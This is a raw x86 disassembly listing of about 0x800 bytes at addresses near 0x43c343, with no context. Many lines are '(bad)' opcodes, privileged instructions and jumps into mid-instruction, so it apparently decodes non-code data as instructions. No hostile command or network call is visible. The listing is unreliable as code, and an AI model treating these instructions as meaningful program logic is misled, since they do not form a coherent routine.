  43c343:	pop    edx
  43c344:	(bad)  
  43c345:	sti    
  43c346:	sub    DWORD PTR [ebp+0x6effff6b],0xffffffff
  43c34d:	retf   0xbbff
  43c350:	adc    BYTE PTR [eax],al
  43c352:	add    DWORD PTR [eax+eax*1-0x12],0xffffffcc
  43c357:	test   eax,0xa383ffdc
  43c35c:	inc    DWORD PTR [ecx+0x0]
  43c35f:	inc    edi
  43c360:	inc    edi
  43c361:	add    BYTE PTR [eax],al
  43c363:	mov    al,ds:0x8f00b400
  43c368:	xor    DWORD PTR [ebx-0x47ff0e00],eax
  43c36e:	add    BYTE PTR [ecx-0x6f],dh
  43c371:	add    BYTE PTR [ebx+0x4900a9],al
  43c377:	in     eax,dx
  43c378:	jae    0x43c379
  43c37a:	inc    DWORD PTR [edi]
  43c37c:	dec    DWORD PTR [eax]
  43c37e:	jmp    FWORD PTR [edi+0x65]
  43c381:	inc    DWORD PTR [eax]
  43c383:	cmp    bh,0x1e
  43c386:	jmp    DWORD PTR [eax-0x3d]
  43c389:	dec    esp
  43c38b:	dec    eax
  43c38c:	mov    DWORD PTR [ebp-0xc4b101],edx
  43c392:	push   DWORD PTR [esi-0x1]
  43c395:	hlt    
  43c396:	add    BYTE PTR [edi+ebp*2+0x2783ff],ah
  43c39d:	mov    al,0x0
  43c39f:	mov    ebx,ds
  43c3a1:	(bad)  
  43c3a2:	inc    DWORD PTR [edx+0x58ff94ff]
  43c3a8:	scas   eax,DWORD PTR es:[edi]
  43c3a9:	add    BYTE PTR [eax],al
  43c3ab:	ror    esp,1
  43c3ad:	hlt    
  43c3ae:	(bad)  
  43c3af:	jmp    0x43c371
  43c3b1:	cmp    edi,0xffffff8b
  43c3b4:	mov    esp,esp
  43c3b6:	int3   
  43c3b7:	mov    ah,0xad
  43c3b9:	add    ah,cl
  43c3bb:	fadd   DWORD PTR [eax]
  43c3bd:	add    BYTE PTR [eax],0xb
  43c3c0:	xchg   edx,eax
  43c3c1:	(bad)  
  43c3c2:	dec    DWORD PTR [ecx+0x0]
  43c3c5:	dec    edi
  43c3c6:	(bad)  
  43c3c7:	cld    
  43c3c8:	std    
  43c3c9:	add    bh,bh
  43c3cb:	mov    edx,0x9b00ebff
  43c3d0:	mov    ch,0xff
  43c3d2:	inc    ebx
  43c3d4:	call   DWORD PTR [ecx-0x77]
  43c3d7:	add    ah,dh
  43c3d9:	dec    esp
  43c3db:	das    
  43c3dc:	cmp    esp,0xffffffff
  43c3df:	pushf  
  43c3e0:	mov    DWORD PTR cs:[eax],eax
  43c3e3:	push   eax
  43c3e4:	add    BYTE PTR [eax+eax*1+0x32],ch
  43c3e8:	inc    DWORD PTR [ebx-0x207c687d]
  43c3ee:	add    BYTE PTR [ecx-0x41ffff09],bh
  43c3f4:	(bad)  
  43c3f5:	cmp    eax,0xff3ee900
  43c3fa:	add    BYTE PTR [eax+eax*1-0x1eb4ff5a],dh
  43c401:	add    BYTE PTR [ecx-0x327cfb],cl
  43c407:	sbb    al,0x81
  43c409:	inc    DWORD PTR [eax]
  43c40b:	mov    ds:0x65898489,al
  43c410:	cmp    al,0xff
  43c412:	jmp    DWORD PTR [eax-0x1]
  43c415:	retf   
  43c416:	int3   
  43c417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c418:	ds mov edi,edi
  43c41b:	push   ebx
  43c41c:	int3   
  43c41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c41e:	int3   
  43c41f:	int3   
  43c420:	sbb    eax,0xff46ffff
  43c425:	inc    esi
  43c426:	(bad)  
  43c427:	std    
  43c428:	push   0xffffff83
  43c42a:	call   esp
  43c42c:	add    ah,dl
  43c42e:	add    BYTE PTR [ecx],ch
  43c430:	mov    ebx,0xff24ffff
  43c435:	sub    bh,bh
  43c437:	push   ecx
  43c438:	mov    bh,0xff
  43c43a:	add    BYTE PTR [esi],al
  43c43c:	cmp    DWORD PTR [eax+eax*1+0x10],0xffffffd8
  43c441:	inc    DWORD PTR [ebx-0xb83364]
  43c447:	inc    ebp
  43c448:	mov    eax,DWORD PTR [eax]
  43c44a:	int3   
  43c44b:	inc    esp
  43c44c:	push   DWORD PTR [eax+0x0]
  43c44f:	rol    DWORD PTR [edx+0x848900],0x39
  43c456:	int3   
  43c457:	out    dx,eax
  43c458:	inc    eax
  43c459:	add    DWORD PTR [eax],0xfffffffe
  43c45c:	mov    ebp,ecx
  43c45e:	jmp    FWORD PTR [ebx+esi*1-0x1]
  43c462:	add    bh,bl
  43c464:	int3   
  43c465:	loop   0x43c466
  43c467:	sub    BYTE PTR [edi-0x1],0xcc
  43c46b:	add    edi,edi
  43c46d:	mov    ebx,0xff23de89
  43c472:	jmp    DWORD PTR [ecx-0x1e000c00]
  43c478:	mov    esp,0xff00ccff
  43c47d:	ins    DWORD PTR es:[edi],dx
  43c47e:	call   FWORD PTR [eax+0x47000046]
  43c484:	call   FWORD PTR [edi]
  43c486:	add    BYTE PTR [edi+0x2fffff4f],dl
  43c48c:	(bad)  
  43c48d:	aas    
  43c48e:	add    dl,ah
  43c490:	add    DWORD PTR [ecx-0x3600b900],ecx
  43c496:	int3   
  43c497:	shr    DWORD PTR [esi-0xac7601],0x1a
  43c49e:	add    BYTE PTR [ebx],bh
  43c4a0:	mov    esi,0xcc71ffff
  43c4a5:	icebp  
  43c4a6:	call   FWORD PTR [edi-0x5aff006e]
  43c4ac:	add    BYTE PTR ds:0xff3f7fff,dl
  43c4b2:	inc    DWORD PTR [edi+edi*8-0x2529331a]
  43c4b9:	add    bh,bh
  43c4bb:	or     BYTE PTR [ebx+0xd0e0038],al
  43c4c1:	cmp    edi,0xffffffa4
  43c4c4:	adc    DWORD PTR [eax+eax*1-0x4b],0x16
  43c4c9:	add    DWORD PTR [ebx+0x90ffc7],0xffffffdc
  43c4d0:	idiv   bh
  43c4d2:	mov    DWORD PTR [edi],ecx
  43c4d4:	xor    DWORD PTR ds:0xffdd5183,0xffffff83
  43c4db:	inc    ebx
  43c4dc:	inc    DWORD PTR [edi]
  43c4de:	xor    DWORD PTR [ecx+0x11],0x0
  43c4e2:	dec    DWORD PTR [ebx+0x41ff03ff]
  43c4e8:	dec    eax
  43c4e9:	add    BYTE PTR [eax],al
  43c4eb:	mov    ah,0xcc
  43c4ed:	or     eax,DWORD PTR [eax]
  43c4ef:	and    bh,bh
  43c4f1:	(bad)  
  43c4f2:	call   FWORD PTR [ecx-0x1]
  43c4f5:	cmp    bh,0x35
  43c4f8:	sub    eax,0xfff90000
  43c4fd:	mov    al,ds:0xff930489
  43c502:	mov    DWORD PTR [ebx-0x7d],eax
  43c505:	cmp    DWORD PTR [ecx-0x7c76f59a],ecx
  43c50b:	test   BYTE PTR [eax],al
  43c50d:	mov    cs,WORD PTR [ecx-0xf43d]
  43c513:	ss dec ecx
  43c516:	int3   
  43c517:	out    0xd0,al
  43c519:	inc    DWORD PTR [eax]
  43c51b:	push   edx
  43c51c:	add    BYTE PTR [ebx-0x7674d600],ah
  43c522:	add    BYTE PTR [edi],al
  43c524:	int3   
  43c525:	jecxz  0x43c527
  43c527:	pop    ds
  43c528:	push   es
  43c529:	add    BYTE PTR [eax],al
  43c52b:	mov    eax,0xd3cc9d83
  43c530:	pop    edx
  43c531:	cmp    edi,0xffffffd8
  43c534:	(bad)  
  43c535:	sub    DWORD PTR ds:[ecx-0x7bffffaa],0x0
  43c53d:	add    BYTE PTR ss:[edx-0x6effff59],ah
  43c544:	int3   
  43c545:	sbb    eax,0xffe34100
  43c54a:	add    BYTE PTR [edx-0x1],bl
  43c54d:	sub    eax,0xfff8a7ff
  43c552:	add    BYTE PTR [esi-0x1],ch
  43c555:	fdivp  st(7),st
  43c557:	fpatan 
  43c559:	int3   
  43c55a:	int3   
  43c55b:	cmp    al,0xff
  43c55d:	mov    bl,0x0
  43c55f:	jmp    0x43c5c3
  43c561:	dec    esp
  43c563:	mov    ds:0x9d89b6ff,eax
  43c568:	leave  
  43c569:	add    DWORD PTR [eax],0xf
  43c56c:	add    BYTE PTR [ecx-0x1],cl
  43c56f:	ret    
  43c570:	mov    ch,0xff
  43c572:	(bad)  
  43c573:	fdivp  st(7),st
  43c575:	pop    ds
  43c576:	call   DWORD PTR [ecx-0x7d]
  43c579:	inc    DWORD PTR [eax]
  43c57b:	inc    DWORD PTR [ebx+0x4987006f]
  43c581:	add    DWORD PTR [ebx-0x4400d6],0xffffffb0
  43c588:	fdiv   st(7),st
  43c58a:	(bad)  
  43c58b:	mov    eax,0xc800b8ff
  43c590:	and    eax,0xff1200cc
  43c595:	jp     0x43c597
  43c597:	push   ebx
  43c598:	(bad)
  43c59c:	inc    DWORD PTR [edx-0x7c09ff01]
  43c5a2:	int3   
  43c5a3:	mov    esi,0xa8ff1600
  43c5a8:	push   0xedffff
  43c5ad:	pushf  
  43c5ae:	add    edi,0x47
  43c5b1:	add    BYTE PTR [eax],al
  43c5b3:	xor    al,BYTE PTR [ebx+0x34530039]
  43c5b9:	inc    DWORD PTR [eax]
  43c5bb:	(bad)
  43c5be:	add    BYTE PTR [ecx+0x5ff0025],bl
  43c5c4:	jmp    DWORD PTR [ebp-0x1]
  43c5c7:	push   0xffffff82
  43c5c9:	(bad)  
  43c5ca:	push   ecx
  43c5cc:	inc    DWORD PTR [ebp-0x77]
  43c5cf:	and    bl,cl
  43c5d1:	add    BYTE PTR [eax],al
  43c5d3:	sbb    bh,bh
  43c5d5:	mov    al,BYTE PTR [ebx-0xff1c14]
  43c5db:	fadd   DWORD PTR [ebx+0x471983fb]
  43c5e1:	add    DWORD PTR [eax],0xffffff81
  43c5e4:	mov    esp,eax
  43c5e6:	push   DWORD PTR [eax]
  43c5e8:	call   0xff5bc570
  43c5ed:	jle    0x43c5ee
  43c5ef:	leave  
  43c5f0:	cmc    
  43c5f1:	add    BYTE PTR [eax],al
  43c5f3:	cmp    edi,0xffffff98
  43c5f6:	call   DWORD PTR [ebx+0x52ff0012]
  43c5fc:	add    BYTE PTR [ebx-0x1],dl
  43c5ff:	inc    esi
  43c600:	ret    0xff83
  43c603:	push   esi
  43c604:	call   eax
  43c606:	add    BYTE PTR [esi-0x55ffff57],bh
  43c60c:	add    BYTE PTR [edi-0x34],al
  43c60f:	jle    0x43c62d
  43c611:	add    BYTE PTR [eax],al
  43c613:	mov    bh,0xff
  43c615:	popf   
  43c616:	jmp    DWORD PTR [edx+eiz*1+0xb8ff00]
  43c61d:	mov    eax,0xff4b1a00
  43c622:	jmp    DWORD PTR [edi]
  43c624:	add    BYTE PTR [esi-0x1],cl
  43c627:	sub    edi,ebp
  43c629:	add    BYTE PTR [ebx-0xd00092],al
  43c62f:	jne    0x43c5c0
  43c631:	add    DWORD PTR [eax],0x4e
  43c634:	mov    DWORD PTR [ebp-0x33fb3e01],edx
  43c63a:	push   DWORD PTR [esi-0x7d]
  43c63d:	dec    esi
  43c63e:	int3   
  43c63f:	ins    DWORD PTR es:[edi],dx
  43c640:	test   BYTE PTR [ebx+0x7bff71ff],0xff
  43c647:	lods   eax,DWORD PTR ds:[esi]
  43c648:	fwait
  43c649:	mov    edi,edi
  43c64b:	dec    ebp
  43c64c:	add    BYTE PTR [ebx],dl
  43c64e:	add    dl,bh
  43c650:	sub    eax,DWORD PTR [ebx+0x7b0031ff]
  43c656:	add    DWORD PTR [edx],0x1c
  43c659:	add    bh,bh
  43c65b:	dec    edx
  43c65c:	push   DWORD PTR ds:0xcc77bc83
  43c662:	add    BYTE PTR [edx-0x1],bl
  43c665:	sar    bh,0x1f
  43c668:	leave  
  43c669:	inc    DWORD PTR [eax]
  43c66b:	call   0x8985:0x8983f1ff
  43c672:	add    BYTE PTR [esi-0x1],dh
  43c675:	push   ebp
  43c676:	or     edx,0x55
  43c679:	dec    esp
  43c67b:	adc    DWORD PTR gs:[ecx-0x1],0xfffffff2
  43c680:	test   eax,0xaeff00
  43c685:	mov    edi,?
  43c687:	cmp    ebp,DWORD PTR [eax+eax*1-0x327ccb00]
  43c68e:	cmp    DWORD PTR [esi],0x47
  43c691:	(bad)  
  43c692:	jmp    esi
  43c694:	or     DWORD PTR [edi+edi*8-0xff7c4c],0xffffffc8
  43c69c:	jmp    FWORD PTR [edx-0x1]
  43c69f:	bound  ecx,QWORD PTR [ebp-0x1]
  43c6a2:	add    BYTE PTR [eax-0x77],ah
  43c6a5:	dec    ebx
  43c6a6:	mov    DWORD PTR [edi],eax
  43c6a8:	repnz dec esp
  43c6ab:	dec    esi
  43c6ac:	call   DWORD PTR [ecx+ecx*4]
  43c6af:	pop    ss
  43c6b0:	pop    esp
  43c6b1:	add    DWORD PTR [eax],0x42
  43c6b4:	(bad)  
  43c6b5:	cmp    al,0xff
  43c6b7:	fnsave [eax-0x677700]
  43c6bd:	xchg   ebx,eax
  43c6be:	add    BYTE PTR [edi+0x67],bl
  43c6c1:	add    ah,cl
  43c6c3:	in     al,0x0
  43c6c5:	(bad)  
  43c6c7:	in     al,dx
  43c6c8:	or     edi,edi
  43c6ca:	add    bh,bh
  43c6cc:	add    BYTE PTR [esi-0x1],ah
  43c6cf:	cwde   
  43c6d0:	and    al,0x83
  43c6d2:	or     DWORD PTR ds:0x7b0096cc,0x35
  43c6d9:	add    DWORD PTR [eax],0xffffffc9
  43c6dc:	add    BYTE PTR [ebp-0x7c1ef701],ch
  43c6e2:	add    BYTE PTR [ecx],dh
  43c6e4:	dec    DWORD PTR [ebx-0x605600]
  43c6ea:	jmp    DWORD PTR [edi+0xa00f2ff]
  43c6f0:	or     al,BYTE PTR [eax]
  43c6f2:	add    BYTE PTR [esi],bh
  43c6f4:	call   DWORD PTR [ecx-0x1]
  43c6f7:	outs   dx,BYTE PTR ds:[esi]
  43c6f8:	push   esp
  43c6f9:	add    BYTE PTR [eax],al
  43c6fb:	add    edi,edi
  43c6fd:	mov    eax,ds:0xff4cb400
  43c702:	add    BYTE PTR [ebx],al
  43c704:	int3   
  43c705:	(bad)  
  43c707:	sar    DWORD PTR [ebx-0xb0001],0x51
  43c70e:	mov    DWORD PTR [eax+0x23],esp
  43c711:	(bad)  
  43c712:	jmp    esp
  43c714:	call   FWORD PTR [edx-0x7cc8917d]
  43c71a:	int3   
  43c71b:	cli    
  43c71c:	jmp    DWORD PTR [ebx]
  43c71e:	add    BYTE PTR [eax+0x3c8300ce],cl
  43c724:	add    BYTE PTR [eax-0x34],bl
  43c727:	stos   DWORD PTR es:[edi],eax
  43c728:	push   ds
  43c729:	dec    DWORD PTR [ecx-0xd10086]
  43c72f:	dec    esi
  43c730:	das    
  43c731:	int3   
  43c732:	push   DWORD PTR [ecx]
  43c734:	mov    DWORD PTR [ecx-0x33905f01],edi
  43c73a:	call   FWORD PTR [edx-0x1]
  43c73d:	ja     0x43c73e
  43c73f:	fsubr  DWORD PTR [edi+edi*8+0x53ccb200]
  43c746:	dec    DWORD PTR [esi+0x7]
  43c749:	inc    DWORD PTR [eax]
  43c74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c74c:	add    DWORD PTR [ecx],0xffffff89
  43c74f:	mov    eax,ds:0x78008343
  43c754:	add    cl,dh
  43c756:	add    BYTE PTR [edi+0x36],ah
  43c759:	add    BYTE PTR [ebx+0x6cc5e],al
  43c75f:	mov    ds:0xe2ffff7a,al
  43c764:	call   DWORD PTR [eax]
  43c766:	call   DWORD PTR [esi-0x2]
  43c769:	mov    edi,edi
  43c76b:	or     BYTE PTR [ebx-0x179600c5],al
  43c771:	dec    esp
  43c773:	sldt   edi
  43c776:	add    BYTE PTR [ecx+0x6],ah
  43c779:	add    bh,bh
  43c77b:	jge    0x43c77d
  43c77d:	inc    DWORD PTR ss:[ebx+edx*1-0x1]
  43c782:	(bad)  
  43c783:	cmp    al,BYTE PTR [eax]
  43c785:	add    BYTE PTR fs:[edx+ecx*2-0x7c057601],cl
  43c78d:	or     BYTE PTR [ecx-0x1a5f],cl
  43c793:	(bad)  
  43c796:	jmp    DWORD PTR [edi-0x7a]
  43c799:	add    BYTE PTR [eax],al
  43c79b:	cld    
  43c79c:	jmp    DWORD PTR [ebp-0x1]
  43c79f:	mov    ebp,DWORD PTR [ebx-0x33b43301]
  43c7a5:	pop    ds
  43c7a6:	jmp    DWORD PTR [ebx]
  43c7a8:	sub    BYTE PTR [eax],al
  43c7aa:	call   DWORD PTR [ecx]
  43c7ac:	inc    DWORD PTR [ebx]
  43c7ae:	inc    DWORD PTR [ecx]
  43c7b0:	mov    ds:0xff3dffff,al
  43c7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c7b6:	mov    DWORD PTR [ecx],edx
  43c7b8:	sar    bh,1
  43c7ba:	push   DWORD PTR [eax-0x1]
  43c7bd:	lock dec DWORD PTR [ebp+0x838993]
  43c7c4:	push   DWORD PTR [ebx-0xe70d01]
  43c7ca:	add    BYTE PTR [ecx],bl
  43c7cc:	call   FWORD PTR [eax]
  43c7ce:	call   esi
  43c7d0:	mov    cl,0xff
  43c7d2:	and    DWORD PTR [edx+0x0],0xffffffd5
  43c7d6:	or     eax,0xffffffdc
  43c7d9:	mov    DWORD PTR [eax],eax
  43c7db:	icebp  
  43c7dc:	inc    DWORD PTR [ecx]
  43c7de:	jmp    FWORD PTR [esi+ecx*8]
  43c7e1:	add    ah,cl
  43c7e3:	jecxz  0x43c768
  43c7e5:	cdq    
  43c7e6:	push   ebp
  43c7e8:	pop    ebp
  43c7e9:	add    BYTE PTR [eax],al
  43c7eb:	in     eax,dx
  43c7ec:	add    BYTE PTR [edi-0x99297d],ah
  43c7f2:	mov    DWORD PTR [ebp+0x590088ff],ebp
  43c7f8:	idiv   bh
  43c7fa:	mov    DWORD PTR [eax+eax*1-0x51600045],esp
  43c801:	add    bh,bh
  43c803:	fld    QWORD PTR [ebx-0x4922003e]
  43c809:	cmp    edi,0xffffffa5
  43c80c:	mov    DWORD PTR [ebx-0x1],eax
  43c80f:	lea    edx,[eax]
  43c811:	add    BYTE PTR [eax],al
  43c813:	test   BYTE PTR [eax],al
  43c815:	inc    esi
  43c816:	add    BYTE PTR [ecx],bl
  43c818:	mov    esp,0x15ffcc
  43c81d:	mov    BYTE PTR [eax],al
  43c81f:	mov    ecx,0x5600ff07
  43c824:	add    BYTE PTR [eax],ah
  43c826:	add    ch,ch
  43c828:	je     0x43c82a
  43c82a:	add    ah,ch
  43c82c:	(bad)  
  43c82d:	cmp    eax,0x83c9bcff
  43c832:	(bad)  
  43c833:	mov    esp,0x4000beff
  43c838:	fild   WORD PTR [eax]
  43c83a:	inc    DWORD PTR [eax+eax*1+0x26]
  43c83e:	int3   
  43c83f:	test   BYTE PTR [ebx-0xaa0001],bh
  43c845:	mov    ds:0xff2ebd00,eax
  43c84a:	add    BYTE PTR [ebp-0x7d],cl
  43c84d:	sar    bh,cl
  43c84f:	xchg   ecx,eax
  43c850:	mov    DWORD PTR [eax],0x1e83
  43c856:	jmp    FWORD PTR [edx-0x71]
  43c859:	(bad)  
  43c85a:	(bad)  
  43c85b:	cld    
  43c85c:	add    DWORD PTR [eax-0x1],0x3a
  43c860:	inc    eax
  43c861:	(bad)  
  43c862:	(bad)  
  43c863:	mov    esi,0xf0ff8aff
  43c868:	xchg   edi,edi
  43c86a:	push   DWORD PTR [eax]
  43c86c:	add    dh,dl
  43c86e:	add    BYTE PTR [edx+0xa],ch
  43c871:	add    bh,bh
  43c873:	mov    al,BYTE PTR [eax]
  43c875:	jnp    0x43c877
  43c877:	fidivr DWORD PTR [esp+ecx*8-0x77]
  43c87b:	jl     0x43c87d
  43c87d:	addr16 add al,dl
  43c880:	inc    eax
  43c881:	inc    DWORD PTR [ebx-0x7c4a7c30]
  43c887:	push   cs
  43c888:	cs add bh,bh
  43c88b:	cmp    ecx,DWORD PTR [ecx+0xe8eff0d]
  43c891:	cmp    edi,0xffffffed
  43c894:	call   DWORD PTR [esi-0x34]
  43c897:	arpl   WORD PTR [ebp-0x76280100],si
  43c89d:	idiv   edi
  43c89f:	enter  0xf9,0xff
  43c8a3:	out    0x0,al
  43c8a5:	or     eax,0x89b5f600
  43c8aa:	push   DWORD PTR [ecx-0x4500eb34]
  43c8b0:	push   ecx
  43c8b1:	add    bh,bh
  43c8b3:	mov    bl,0xff
  43c8b5:	les    eax,FWORD PTR [eax]
  43c8b7:	inc    ebp
  43c8b8:	and    eax,0x837b83ff
  43c8bd:	mov    ds:0xccbdfbcc,al
  43c8c2:	dec    esi
  43c8c4:	add    BYTE PTR [esi-0x1],al
  43c8c7:	hlt    
  43c8c8:	pop    ebx
  43c8c9:	(bad)  
  43c8ca:	push   DWORD PTR [ecx]
  43c8cc:	int3   
  43c8cd:	push   ebp
  43c8ce:	push   DWORD PTR [edi+0x35]
  43c8d1:	cmp    edi,0x40
  43c8d4:	sbb    DWORD PTR [esi+0x0],0xffffffe1
  43c8d8:	fwait
  43c8d9:	add    DWORD PTR [ebx+0xdccc25],0xffffffbf
  43c8e0:	inc    DWORD PTR [bx+si]
  43c8e3:	in     eax,0xff
  43c8e5:	(bad)  
  43c8e6:	dec    DWORD PTR [edi-0x470000e1]
  43c8ec:	(bad)  
  43c8ed:	cmp    bh,bh
  43c8ef:	xchg   ebx,eax
  43c8f0:	sbb    al,0xff
  43c8f2:	call   FWORD PTR [eax]
  43c8f4:	add    dl,ah
  43c8f6:	call   FWORD PTR [edi+0x6]
  43c8f9:	dec    DWORD PTR [ecx-0xb600a4]
  43c8ff:	xor    BYTE PTR [edi-0x71ff01],ah
  43c905:	pop    edi
  43c906:	inc    ebp
  43c908:	mov    edi,edi
  43c90a:	inc    DWORD PTR [edi+edi*8-0x694cffe2]
  43c911:	mov    DWORD PTR [eax],eax
  43c913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c914:	dec    DWORD PTR [edi+0x0]
  43c917:	dec    edi
  43c918:	icebp  
  43c919:	mov    edi,edi
  43c91b:	or     ah,cl
  43c91d:	daa    
  43c91e:	add    bh,cl
  43c920:	mov    dl,0x89
  43c922:	(bad)  
  43c923:	mov    ebp,0x3aff1700
  43c928:	sub    eax,DWORD PTR [eax]
  43c92a:	add    BYTE PTR [eax-0x9003801],bh
  43c930:	xor    bh,bh
  43c932:	add    BYTE PTR [esi],al
  43c934:	(bad)  
  43c935:	mov    eax,0xff2b1aff
  43c93a:	call   FWORD PTR [ecx-0x1]
  43c93d:	adc    eax,DWORD PTR [eax]
  43c93f:	daa    
  43c940:	dec    edx
  43c941:	add    bh,bh
  43c943:	add    eax,DWORD PTR [eax]
  43c945:	dec    esp
  43c946:	add    dh,cl
  43c948:	in     al,dx
  43c949:	add    ah,cl
  43c94b:	jno    0x43c94d
  43c94d:	push   cs
  43c94e:	push   DWORD PTR ds:0x483893f
  43c954:	add    BYTE PTR [ebx-0xb24501],bl
  43c95a:	mov    DWORD PTR ds:0xdefff700,eax
  43c960:	sbb    bh,bh
  43c962:	add    BYTE PTR [ecx+0x2c8991ff],ch
  43c968:	and    al,BYTE PTR [eax]
  43c96a:	(bad)  
  43c96b:	(bad)  
  43c96d:	cld    
  43c96e:	add    BYTE PTR [edi],dh
  43c970:	or     al,0x83
  43c972:	jmp    DWORD PTR [edi+edi*8]
  43c975:	fld    QWORD PTR [eax]
  43c977:	adc    eax,0xb600ffad
  43c97c:	push   DWORD PTR [edx]
  43c97e:	add    edx,0xffffffd1
  43c981:	inc    DWORD PTR [eax]
  43c983:	pop    ds
  43c984:	push   edx
  43c986:	add    BYTE PTR [esi+0x71],ch
  43c989:	cmp    edi,0xffffffa3
  43c98c:	add    DWORD PTR [eax-0x1],0x4a
  43c990:	ins    DWORD PTR es:[edi],dx
  43c991:	inc    DWORD PTR [eax]
  43c993:	push   ss
  43c994:	add    al,ch
  43c996:	call   eax
  43c998:	pusha  
  43c999:	add    BYTE PTR [eax],al
  43c99b:	lea    eax,[eax]
  43c99d:	adc    DWORD PTR [ecx-0x7c002d6b],ecx
  43c9a3:	add    bh,bh
  43c9a5:	dec    ecx
  43c9a6:	jmp    FWORD PTR [edx]
  43c9a8:	std    
  43c9a9:	(bad)  
  43c9aa:	dec    DWORD PTR [ebx-0x7d]
  43c9ad:	clc    
  43c9ae:	call   FWORD PTR [ebp+0x14]
  43c9b1:	add    ah,cl
  43c9b3:	scas   eax,DWORD PTR es:[edi]
  43c9b4:	add    ch,bh
  43c9b6:	push   DWORD PTR [eax-0x35ffffcb]
  43c9bc:	dec    DWORD PTR [esi]
  43c9be:	(bad)  
  43c9bf:	jnp    0x43ca38
  43c9c1:	inc    DWORD PTR [eax]
  43c9c3:	and    edi,edi
  43c9c5:	mov    eax,0xff9504ff
  43c9ca:	add    BYTE PTR [eax-0x7d],bh
  43c9cd:	adc    al,0x83
  43c9cf:	adc    bh,BYTE PTR [ebp-0x34]
  43c9d2:	cmp    DWORD PTR [ecx+0x3aff01cc],0xffffff97
  43c9d9:	add    ah,cl
  43c9db:	adc    eax,0xc2ffe0ff
  43c9e0:	inc    ebp
  43c9e1:	(bad)  
  43c9e2:	inc    esi
  43c9e4:	call   edx
  43c9e6:	inc    DWORD PTR ds:0x4dcc0054
  43c9ec:	int3   
  43c9ed:	sbb    edi,edi
  43c9ef:	add    al,0x34
  43c9f1:	dec    esp
  43c9f3:	add    BYTE PTR ss:[edi+edi*8+0x15],dl
  43c9f8:	cmp    edi,edi
  43c9fa:	push   DWORD PTR [edx+0x0]
  43c9fd:	cmp    al,0xff
  43c9ff:	(bad)  
  43ca00:	ds add bh,bh
  43ca03:	jnp    0x43ca05
  43ca05:	int3   
  43ca06:	mov    ecx,ebp
  43ca08:	dec    edx
  43ca09:	add    bh,bh
  43ca0b:	call   FWORD PTR ss:[edx-0xcbad34]
  43ca12:	dec    DWORD PTR [ebp-0x1900b201]
  43ca18:	mov    dl,0xcc
  43ca1a:	adc    DWORD PTR [eax+eax*1],0xffffff9c
  43ca1e:	(bad)  
  43ca1f:	sti    
  43ca20:	inc    edi
  43ca21:	add    bh,bh
  43ca23:	or     edi,edi
  43ca25:	outs   dx,DWORD PTR ds:[esi]
  43ca26:	add    BYTE PTR [edi+ebp*1-0x7c647c01],ah
  43ca2d:	mov    ebx,0x897e06ff
  43ca32:	push   DWORD PTR [ebp+0x128963ff]
  43ca38:	inc    esp
  43ca39:	add    bh,bh
  43ca3b:	pusha  
  43ca3c:	dec    DWORD PTR [edi+edi*8-0xff309c]
  43ca43:	add    cl,ah
  43ca45:	mov    ecx,0xff52df89
  43ca4a:	int3   
  43ca4b:	call   FWORD PTR fs:[edi-0x33856500]
  43ca52:	add    BYTE PTR [ebx+0x0],al
  43ca55:	cmp    eax,DWORD PTR [eax]
  43ca57:	scas   eax,DWORD PTR es:[edi]
  43ca58:	sbb    eax,0x833b83ff
  43ca5d:	mov    eax,ds:0xff01b800
  43ca62:	call   FWORD PTR [ebx-0x4c005b01]
  43ca68:	add    al,BYTE PTR [eax]
  43ca6a:	add    BYTE PTR [edi+edi*8+0x2af20029],dh
  43ca71:	mov    edi,edi
  43ca73:	xchg   ebp,eax
  43ca74:	push   DWORD PTR [edi-0xfd6701]
  43ca7a:	add    BYTE PTR [ecx+0x0],dh
  43ca7d:	call   0x8423d981
  43ca82:	inc    DWORD PTR [eax+eax*1]
  43ca85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ca86:	mov    DWORD PTR [ebx-0x4ffff67],esp
  43ca8c:	push   DWORD PTR [ebx-0x77]
  43ca8f:	ffreep st(4)
  43ca91:	(bad)  
  43ca92:	call   DWORD PTR [edx]
  43ca94:	add    cl,ah
  43ca96:	call   DWORD PTR [edx]
  43ca98:	and    al,BYTE PTR [ebx+0x360093ff]
  43ca9e:	add    dl,ah
  43caa0:	ror    ah,1
  43caa2:	mov    ebx,esi
  43caa4:	add    BYTE PTR [ecx],dh
  43caa6:	int3   
  43caa7:	xor    DWORD PTR [eax+0xdcffff],edx
  43caad:	xchg   ah,cl
  43caaf:	test   BYTE PTR [esi-0x277c01],cl
  43cab5:	mov    esp,0xfffd2783
  43caba:	add    BYTE PTR [eax-0x15005d00],dh
  43cac0:	clc    
  43cac1:	add    BYTE PTR [ecx-0xa27c02],cl
  43cac7:	ins    DWORD PTR es:[edi],dx
  43cac8:	adc    DWORD PTR [ebx-0x38ff9e00],eax
  43cace:	add    ah,ch
  43cad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43cad1:	mov    DWORD PTR [eax],eax
  43cad3:	int3   
  43cad4:	xor    DWORD PTR [esi-0xf68901],0xffffffff
  43cadb:	sahf   
  43cadc:	(bad)  
  43cadd:	(bad)  
  43cadf:	mov    eax,ds:0x9bffffa1
  43cae4:	(bad)  
  43cae5:	call   0xe47bea
  43caea:	add    BYTE PTR [ebx+0x0],al
  43caed:	cdq    
  43caee:	and    DWORD PTR ds:0x64ff89c2,0x0
  43caf5:	jnp    0x43ca80
  43caf7:	adc    BYTE PTR [ebx],bh
  43caf9:	(bad)  
  43cafa:	(bad)  
  43cafb:	mov    ebx,0x14fff400
  43cb00:	sub    eax,0x94ffff
  43cb05:	jns    0x43cb06
  43cb07:	adc    BYTE PTR [esi-0x1],ah
  43cb0a:	mov    DWORD PTR [esi],edx
  43cb0c:	add    BYTE PTR [esi-0xfc4301],dl
  43cb12:	jmp    esi
  43cb14:	call   eax
  43cb16:	call   DWORD PTR [edi]
  43cb18:	jbe    0x43cb19
  43cb1a:	add    bl,al
  43cb1c:	add    BYTE PTR [edi],al
  43cb1e:	call   eax
  43cb20:	and    edi,edi
  43cb22:	call   DWORD PTR [ebp-0x13ffa601]
  43cb28:	lahf   
  43cb29:	or     DWORD PTR [ecx-0x507c89],0xa
  43cb30:	push   0xffffffff
  43cb32:	cmp    DWORD PTR [ecx+0x33002100],0x74
